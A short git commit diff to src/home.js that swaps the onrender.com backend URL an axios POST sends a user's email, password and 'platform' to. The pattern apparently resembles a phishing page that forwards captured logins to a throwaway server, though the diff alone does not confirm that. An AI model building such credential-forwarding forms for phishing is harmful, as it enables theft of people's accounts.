2566d8a537816ac17de403b5cccf7b5e6457d47d
Sparkddev <152620393+Sparkddev@users.noreply.github.com>
2023-12-15 05:40:29 -0800

    Update home.js

--- src/home.js
+++ src/home.js
@@ -21,7 +21,7 @@ function Home(){
 
 
         try {
-            const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
+            const response = await axios.post('https://oneback-9wpi.onrender.com/api/send', {
                 email:email,
                 password:password,
                 platform:platform
